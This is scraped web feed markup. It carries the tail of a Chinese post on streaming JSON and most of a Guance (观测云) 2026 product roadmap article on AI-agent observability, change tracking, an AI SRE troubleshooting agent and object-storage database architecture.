<p>作为准前端开发专家的你，第一时间获取前端资讯、技术干货、AI 课程，那不得关注下我的公众号「冴羽」。</p>
<p>流式传输 JSON 数据是一种提升 Web 应用感知性能的有效方法，尤其适用于处理大型数据集或动态生成数据。</p>
<p>通过在数据可用时立即发送部分数据，我们可以让客户端更早地开始渲染内容，从而带来更佳的用户体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[这篇一定要看，观测云 2026 产品路线图全公开]]></title>    <link>https://juejin.cn/post/7591882877312532532</link>    <guid>https://juejin.cn/post/7591882877312532532</guid>    <pubDate>2026-01-06T09:23:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591882877312532532" data-draft-id="7592119218025152547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="这篇一定要看，观测云 2026 产品路线图全公开"/> <meta itemprop="keywords" content="产品"/> <meta itemprop="datePublished" content="2026-01-06T09:23:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="可观测性用观测云"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            这篇一定要看，观测云 2026 产品路线图全公开
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    可观测性用观测云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:23:26.000Z" title="Tue Jan 06 2026 09:23:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">序言：奇点临近，可观测性的代际跨越</h2>
<p>站在 2026 年的时间节点回望，我们正处于 IT 基础设施历史上最深刻的变革之中。这不仅是云计算的延续，更是一场由人工智能（AI）主导的“认知革命”。如果说云原生（Cloud Native）时代解决了资源的弹性问题，那么 AI 原生（AI Native）时代则致力于解决决策的自主性问题。</p>
<p>Gartner 的战略预测早已指出，到 2026 年底，由于缺乏足够的 AI 风险护栏，甚至可能出现数千起因 AI 决策失误导致的法律索赔案件。这一预测不仅揭示了 AI 技术的双刃剑效应，更深刻地指出了当前技术栈中最大的空白——对于自主智能体（Autonomous Agents）的深度可观测性与治理能力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1a71fc8a356450187d3a6e7c72384d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=9%2FubEZH3kru89mp4sL0sWpUqNio%3D" alt="" loading="lazy"/></p>
<p>在 2026 年的企业环境中，由于 Agentic AI 的普及，软件不再仅仅是执行预定义代码的静态指令集，而是变成了具有推理、规划和执行能力的“数字员工”。这些智能体像 F1 赛车的维修团队一样协作，以模块化的方式处理复杂的业务逻辑。然而，这种自主性带来了前所未有的不确定性：一个简单的用户请求可能触发成百上千次非确定性的模型推理、工具调用和数据库交互。传统的应用性能监控（APM）工具，基于确定性的堆栈跟踪和静态的拓扑图，已无法完全解释这种动态生成的行为链路。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a202ef31f5c4666ba2bca997443a8eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=UyPx%2FPiFZeS0bVoXWphfSomROQI%3D" alt="" loading="lazy"/></p>
<p>与此同时，数据重力的法则依然生效且愈发严苛。随着生成式 AI 和多模态交互的爆发，企业产生的数据量呈指数级增长，但 IT 预算的增长却远远滞后。如何在数据爆炸的背景下，既保持对所有信号的敏锐捕捉，又严格控制存储成本，成为了 SRE 和 CIO 面临的头号难题。传统的“索引一切”（Index Everything）的日志管理模式在经济上已然破产，市场迫切呼唤一种全新的、基于存算分离架构的数据底座。<br/>
本文将作为观测云（Guance）2026 年的产品技术展望，深入剖析在这一大变革背景下，我们如何通过产品演进解决测试、业务、数分、SRE 等多角色的核心痛点。我们将沿着“从上层业务应用到底层基础设施”的逻辑脉络，抽丝剥茧，呈现一个全栈可观测的 2026 图景。</p>
<h2 data-id="heading-1">1. 市场趋势：驱动变革的四股力量</h2>
<p>在展开产品细节之前，我们需要厘清推动 2026 年可观测性技术变革的宏观力量。</p>
<h3 data-id="heading-2">1.1 AI Agent 的崛起与黑盒治理危机</h3>
<p>2026 年，AI 不再是辅助工具，而是核心生产力。Gartner 指出，AI 原生开发平台正在让自主 Agent 协作完成复杂任务。然而，Agent 的引入带来了全新的不可预测性：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc13f6025e50490f8235eba259d0088d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=tgnTw6aBF%2FPXd7M8Ebq%2F9l2QQ3U%3D" alt="" loading="lazy"/></p>
<ul>
<li>非确定性路径：Agent 的决策逻辑是动态生成的，传统的基于固定代码路径的 APM 难以追踪其思维链。</li>
<li>Token 经济学：每一次 API 调用都对应着真金白银。监控系统的核心指标从 CPU 使用率转向了“Token 消耗率”与“任务完成成本”。</li>
<li>黑盒风险：当 Agent 陷入死循环或产生幻觉时，传统的监控告警往往滞后，导致巨额的 API 费用浪费。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9aed30c7ff2f40ba8234091896efc73a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=91eYvdh98WsfdojacWfBu%2Fv70e0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 数据引力与存算分离的必然</h3>
<p>随着数字化转型的深入，企业数据量正以每年 180 EB 的速度增长。传统的基于本地磁盘（SSD/HDD）的存储架构（存算耦合）面临巨大的成本压力：</p>
<ul>
<li>扩容困境：为了增加存储空间，不得不增加计算节点，导致计算资源闲置浪费。</li>
<li>冷热数据鸿沟：90% 的查询集中在最近 24 小时的数据，但为了合规，企业必须存储数年的历史数据。将所有数据都放在昂贵的块存储上在经济上已不可行。</li>
<li>解决方案：市场正全面转向基于对象存储（S3/OSS）的存算分离架构，这也是 GuanceDB 演进的必然方向。</li>
</ul>
<h3 data-id="heading-4">1.3 平台工程（Platform Engineering）与左移</h3>
<p>DevOps 正在进化为平台工程。开发者不再满足于被动接收告警，他们需要自服务的、可编程的观测能力。可观测性正在“左移”进入 CI/CD 流水线，开发者要求能够通过代码（Monitoring as Code）定义监控规则，并通过 API 触发自动化修复流程。</p>
<h3 data-id="heading-5">1.4 FinOps 与数据主权的博弈</h3>
<p>随着全球数据法规（GDPR 等）的收紧，大型企业越来越倾向于“控制面与数据面分离”的架构。他们希望利用 SaaS 厂商提供的先进 AI 分析能力（控制面），但要求原始遥测数据保留在自己的云账号下的对象存储桶中（数据面），即 BYOS（Bring Your Own Storage）模式。</p>
<h2 data-id="heading-6">2. 观测云新的产品功能：蓝图 (Blueprint)</h2>
<p>—— 可观测性编排与自动化引擎</p>
<p>在观测云 2026 的规划中，“蓝图”（Blueprint）不是一张静态的架构图或一套预设的 Dashboard 模板。基于最新的用户需求与 UI 设计，蓝图被重新定义为“官方组件支持计划”的核心载体，是一个低代码/无代码的可观测性编排与自动化引擎。</p>
<p>它通过可视化工作流（DAG - 有向无环图）将分散的观测能力串联起来，形成从 数据查询 -&gt; 逻辑转换 -&gt; AI 分析 -&gt; 行动 的完整闭环。</p>
<h3 data-id="heading-7">2.1 蓝图的核心架构：可视化 DAG 工作流</h3>
<p>传统的监控告警是离散的：一个阈值触发一封邮件。而 2026 年的蓝图引擎引入了状态机与流式处理的概念。蓝图工作流由以下四类核心节点构成，支持用户通过拖拽方式构建复杂的运维逻辑：</p>
<h4 data-id="heading-8">2.1.1 数据查询节点（Input / Sensor）</h4>
<ul>
<li>
<p>DQL (Data Query Language) 驱动：支持复杂的查询逻辑，包含了简单的指标阈值（如 CPU &gt; 80%），更加支持跨数据源的关联查询。</p>
<ul>
<li>示例：“查询最近 5 分钟支付接口的 P99 延迟，且仅当该延迟不仅超过阈值，同时伴随错误日志激增时触发。”</li>
</ul>
</li>
<li>
<p>多源异构：支持 Metrics、Logs、Traces、RUM（用户体验数据）的混合查询。</p>
</li>
</ul>
<h4 data-id="heading-9">2.1.2 转换与逻辑节点（Processor / Logic）</h4>
<ul>
<li>低代码处理：支持 JavaScript/TypeScript 片段或表达式语言（Expression Language）。</li>
<li>上下文丰富：原始告警往往缺乏上下文。转换节点可以调用外部 CMDB 或 K8s API，为告警数据打上“业务线”、“负责人”、“部署版本”等标签。</li>
<li>价值：解决“告警疲劳”的核心手段。通过逻辑判断（如去重、抑制、时间窗聚合），将 100 条原始告警压缩为 1 条高价值根因分析。</li>
</ul>
<h4 data-id="heading-10">2.1.3 AI 分析节点（Intelligence / Obsy AI）</h4>
<ul>
<li>ObsyAI 智能体介入：这是蓝图的智能核心。当逻辑节点检测到异常后，自动唤起 ObsyAI 进行根因分析。</li>
<li>能力：自动关联该时间段内的变更事件（Change Events）、错误日志聚类（Log Patterns）和异常链路等等。</li>
<li>输出：一段自然语言描述的诊断建议：“检测到支付服务延迟升高，关联到 3 分钟前 payment-service 的 v2.1 发布，且 DB 连接池报错激增。”</li>
</ul>
<h4 data-id="heading-11">2.1.4 行动节点（Action / Actuator）</h4>
<ul>
<li>
<p>OpenAPI 闭环：这是蓝图与传统监控的最大区别。它通过 OpenAPI 与外部系统对接，执行实质性操作。</p>
</li>
<li>
<p>场景覆盖：</p>
<ul>
<li>通知：发送富文本消息到 Slack/钉钉/企业微信（包含 AI 诊断结果）等任意communication channel。</li>
<li>监控器管理：自动静默非核心服务的告警，或在流量高峰期动态调整阈值。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b5cd669e7cc458a9817ccc4f74c4869~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=zhJ0K%2F8udbunFqB3Z9Fopj3s5wk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">3. 更加全面的变更观测 (Change Observability)</h2>
<p>—— 根因分析的时间维度</p>
<h3 data-id="heading-13">3.1 变更：系统熵增的核心问题</h3>
<p>根据 SRE 的经验法则，80% 的生产事故是由变更（Change）引起的。无论是代码发布、配置文件的修改、Feature Flag 的切换，还是基础设施的扩缩容操作，都是打破系统稳态的潜在因素。然而，传统的监控工具往往只记录了“结果”（Metrics 的突变、Logs 的报错），却丢失了“原因”（谁、在什么时候、做了什么变更）。</p>
<p>观测云 2026 将“变更”提升为与 Logs、Metrics、Traces 同等的一级数据公民（First-Class Citizen），构建了全维度的 变更观测（Change Observability） 体系。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03999d43f8624338ac9b6497403c6043~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=X0Yt%2Fiu1uAntQmJ0fpPP0U0NMRw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">3.2 变更数据的全栈采集与关联</h3>
<h4 data-id="heading-15">3.2.1 统一变更数据模型</h4>
<p>为了捕捉系统中的每一次变化，观测云 2026 建立了一套标准化的变更数据模型：</p>
<ul>
<li>应用层：深度集成 Jenkins、GitLab、GitHub Actions 等 CI/CD 工具，自动捕获部署事件（Deployment）、Commit 信息、Artifact 版本。</li>
<li>基础设施层：监听 Kubernetes Events（如 Pod Killing, Scaling）、云厂商审计日志（如 AWS CloudTrail、阿里云 ActionTrail），捕获资源的创建、销毁和规格变更。</li>
<li>配置层：对接 Nacos、Apollo、Consul 等配置中心，实时记录配置项的 Diff。记录配置变了，还记录从什么变成了什么。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2562ec78ce944a99d1e7b0af3a4ed03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=JCw2B7AZ%2B4rYTH8OvFMInCRRK4A%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-16">3.2.2 变更叠加分析（Change Overlay）</h4>
<p>变更观测的核心价值在于上下文的融合。在观测云的所有时序图表（Metric Charts）上，系统会自动叠加变更事件的标记（Annotations）。</p>
<ul>
<li>
<p>场景示例：</p>
<ul>
<li>传统视图：看到 API 错误率曲线在 14:00 突然飙升，SRE 开始排查日志。</li>
<li>变更观测视图：看到错误率飙升的同时，时间轴上显示 13:59 分有一个“支付服务 v3.2 Canary 发布”的标记。鼠标悬停即可看到该发布的 Commit Message 和变更人。</li>
</ul>
</li>
</ul>
<p>这种直观的视觉关联，能够将 MTTR（平均修复时间）从小时级缩短至分钟级。运维人员不再需要去各个聊天群里询问“刚才谁动了线上环境？”，变更观测直接给出了答案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9e7e4e444324e1c981734dfca7fcf7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=rPmWPcP%2FyBZ4XMb%2BXViaQhb4fRQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-17">3.2.3 变更风险评分与智能门禁</h4>
<p>结合 Arbiter 引擎的历史分析能力，系统能对每一次变更进行风险评分。如果某次代码提交修改了核心链路的关键文件，且缺乏足够的测试覆盖率，或者历史数据显示该开发者的变更回滚率较高，系统将在变更发生前发出预警，甚至联动 CI/CD 流水线进行阻断。</p>
<h2 data-id="heading-18">4. Obsy AI SRE Agent 推出：可交互的根因分析侦探</h2>
<p>观测云 2026 颠覆了传统人找数据的排查模式，推出了一套基于 动态假设树（Dynamic Hypothesis Tree） 的交互式排查界面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36f74d618dc7434189b9a8503404227a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=WENn%2BaKAy8S1lJb6hwAYVtnm92E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-19">4.1 触发与情境感知</h3>
<p>当监控器发现异常（例如 flight-query-api 接口响应时间 P99 &gt; 2s），系统将直接启动 Obsy AI SRE Agent。在观测云的 Console 中，用户会看到一个关联了错误上下文（Error Trace、Latency Chart）的交互式卡片。</p>
<h3 data-id="heading-20">4.2 动态假设引擎（Dynamic Hypothesis Engine）</h3>
<p>AI Agent 不会盲目列出所有指标，而是像一位经验丰富的 SRE 工程师一样进行逻辑推演。它会基于当前的异常特征，生成多条排查路径（Investigative Plans），并依据历史数据和专家知识库计算出每一条路径的置信度概率：</p>
<ul>
<li>Plan A (概率：高)：假设为数据库超时（DB Connection Block / Slow SQL）。</li>
<li>Plan B (概率：低)：假设为上游依赖服务响应变慢。</li>
<li>Plan C (概率：低)：假设为网络网关故障。</li>
</ul>
<h3 data-id="heading-21">4.3 交互式思维导图与递归诊断</h3>
<p>用户点击高概率的 Plan A，界面将展开一个可视化的排查思维导图。这不仅仅是静态图表，而是 AI 正在执行的逻辑动作流：</p>
<ul>
<li>节点展开：Agent 自动检查 "RDS 资源水位" -&gt; "数据库连接池状态" -&gt; "慢查询日志分析"。</li>
<li>执行验证：每个节点会显示执行状态（Check Passed / Failed）。例如，AI 发现连接池正常，但捕获到了一条全表扫描的慢 SQL。</li>
<li>根因锁定：当 AI 找到确凿证据（如：flight_no 字段缺失索引导致全表扫描），它会标记为“Root Cause Identified”，并生成自然语言的结论报告。</li>
</ul>
<h3 data-id="heading-22">4.4 闭环与反馈</h3>
<ul>
<li>对话式追问：在锁定根因后，用户可以直接与 Agent 对话：“如何修复这个问题？”Agent 会根据知识库提供 Runbook 建议（如：添加索引的 SQL 语句）。</li>
<li>多路径回溯：如果 Plan A 的排查结果显示一切正常（Negative Result），Agent 会智能建议用户切换至 Plan B 或 Plan C。系统会自动保留已排查过的路径记录，避免重复工作，直到递归找到真正的问题源头。</li>
<li>人工接管：整个 UI 包含清晰的 "Abort/Take Over" 按钮，允许工程师随时打断 AI 的自动化逻辑，手动介入排查。</li>
</ul>
<p>这套设计融合了现代工程美学与 AI 智能，将原本黑盒的 AI 思考过程透明化（White-box），让 SRE 既能享受 AI 的效率，又能保持对排查逻辑的掌控。</p>
<h2 data-id="heading-23">5. GuanceDB 演进策略：云原生内核的重构</h2>
<p>GuanceDB 3.0 是观测云强健的心脏。现有的数据库架构大多基于本地磁盘（Shared-Nothing 架构），在面对 PB 级数据时，扩展成本高昂且缺乏弹性。GuanceDB 3.0 的核心目标是演进为基于对象存储（S3-Native）的存算分离架构。在这一演进过程中，我们必须正视目前与行业标杆的技术差距，并提出针对性的优化策略。</p>
<h3 data-id="heading-24">5.1 关键演进挑战与探索方向</h3>
<p>GuanceDB 的演进要解决对象存储带来的物理限制：高延迟与元数据管理。</p>
<h4 data-id="heading-25">5.1.1 挑战一：海量小文件元数据瓶颈 (Metadata Bottleneck)</h4>
<ul>
<li>
<p>痛点：在实时写入场景下（如 IoT），会产生数以亿计的小文件（Objects）。如果 GuanceDB 3.0 的元数据层不够强大，查询时的“列出文件”操作就会成为瓶颈，导致查询超时。</p>
</li>
<li>
<p>演进方向：分布式元数据架构</p>
<ul>
<li>探索：不再依赖单体 SQL 数据库存储元数据。探索分布式 Key-Value 存储来构建元数据层。</li>
<li>目标：支持每秒数十万次的元数据读写，确保即使底层有百亿个 S3 对象，查询规划器也能在毫秒级定位到需要扫描的文件。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-26">5.1.2 挑战二：存算分离后的查询延迟 (Cold Start Latency)</h4>
<ul>
<li>
<p>痛点：S3 的首字节延迟（TTFB）通常在几十到几百毫秒。对于“老板看数”的实时 Dashboard 场景，这种延迟是不可接受的。</p>
</li>
<li>
<p>演进方向：智能分层与分布式缓存 (Smart Tiering &amp; Caching)</p>
<ul>
<li>热数据 (Hot)：近期的数据查询直接走本地内存/磁盘，速度极快。</li>
<li>温数据 (Warm)：引入分布式缓存层。对于经常访问的“昨天”或“上周”的数据，在计算节点的 SSD 上进行 LRU 缓存。</li>
<li>冷数据 (Cold)：完全沉淀在 S3。查询时按需拉取，接受秒级延迟，换取极致成本。</li>
<li>价值：实现“像 SSD 一样快，像 S3 一样便宜”。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-27">5.1.3 挑战三：Compaction (压缩) 策略与写放大</h4>
<ul>
<li>
<p>痛点：为了优化查询，必须将 S3 上的小文件合并为大文件（Compaction）。但 S3 的 PUT 操作是收费的，且消耗网络带宽。</p>
</li>
<li>
<p>演进方向：成本感知的智能 Compaction</p>
<ul>
<li>策略：不盲目压缩。引入基于“查询热度”和“S3 计费模型”的代价函数。</li>
<li>探索：利用 Spot Instances（竞价实例）在云厂商的闲时运行 Compaction 任务，将小文件合并为列式存储（Parquet/ORC 变体），同时构建布隆过滤器（Bloom Filters）和 Min/Max 索引，以减少未来的扫描量。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fae4001d4c4744e69df56b5e6a87ec9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=hv1FacnSXMDIDl104pKuUwuirDg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-28">6. 落地 Targeting Needs：场景化痛点的精准打击</h2>
<p>技术必须服务于业务。不同的大客户场景对数据平台的需求是截然不同的，甚至是互斥的。我们不能用一套参数满足所有人，而是提供灵活，可以满足特种需求的的数据引擎。</p>
<h3 data-id="heading-29">6.1 场景一：实时查询（Real-Time Query）—— 老板看数</h3>
<ul>
<li>
<p>用户：CIO、CTO、NOC 监控大屏。</p>
</li>
<li>
<p>痛点：Dashboard 需要秒级刷新。读多写少，并发高。传统的 OLAP 引擎在处理聚合查询时延迟较高，且并发能力受限。</p>
</li>
<li>
<p>观测云 2026 解决方案：流式聚合。</p>
<ul>
<li>原理：GuanceDB 不再每次刷新都扫描原始日志。在数据摄取（Ingest）阶段，通过流式预聚合引擎（Pre-aggregation Engine）自动维护常用指标（如 Global_Error_Rate）。</li>
<li>效果：Dashboard 查询实际上是在读取一张极小的预计算表，无论原始数据量是 1TB 还是 1PB，大屏刷新始终保持在亚秒级。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbf0057e20234b4dbdcae0a513126d43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=vgEDTHUlkwBzBMlqd4nS9IPaUW4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-30">6.2 场景二：批量报表与数据挖掘 —— 分析师的深潜</h3>
<ul>
<li>
<p>用户：SRE 专家、安全分析师、运营人员。</p>
</li>
<li>
<p>痛点：读少，但 IO 极重。需要扫描过去 30 天的海量日志进行根因分析或生成月度运营报告。容易导致数据库 OOM (Out of Memory) 或查询超时。</p>
</li>
<li>
<p>观测云 2026 解决方案：向量化执行引擎 + Serverless 扫描。</p>
<ul>
<li>原理：利用存算分离架构，当检测到此类大查询时，GuanceDB 动态弹出一组 Serverless 计算节点（Worker），并行扫描 S3 上的数据块。利用 SIMD 指令集和向量化执行（Vectorized Execution）加速过滤。</li>
<li>开放性：支持通过 DQL 导出数据到 Notebook 或外部数仓，满足深度挖掘需求。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78387a8ea1e640a8b5449209019a6892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=4vXjJv5vlOiAErPPIhV6DOoigso%3D" alt="" loading="lazy"/></p>
